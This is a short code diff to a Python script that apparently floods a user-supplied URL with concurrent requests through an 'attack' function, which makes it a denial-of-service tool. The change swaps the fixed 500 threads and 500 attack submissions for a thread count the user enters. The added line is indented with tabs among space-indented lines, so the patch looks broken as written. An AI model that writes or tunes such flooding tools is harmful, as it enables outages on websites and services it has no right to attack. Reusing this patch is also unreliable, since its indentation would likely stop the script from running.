@@ -122,15 +122,19 @@ if __name__ == "__main__":
     host = re.search(r'(https?://)?([^/]*)/?.*', url).group(2)
 
     safe_option = input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Enable Safe Mode (yes/no): ").strip().lower()
+
+				thread_Num = int(input(f"{Fore.YELLOW}[ ? ] {Fore.GREEN}Threads: "))
+
+
     if safe_option == "yes":
         set_safe()
 
     monitor_thread = Thread(target=monitor_requests, daemon=True)
     monitor_thread.start()
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_Num) as executor:
         try:
-            futures = [executor.submit(attack, url) for _ in range(500)]
+            futures = [executor.submit(attack, url) for _ in range(thread_Num)]
             concurrent.futures.wait(futures)
         except KeyboardInterrupt:
             set_flag(2)
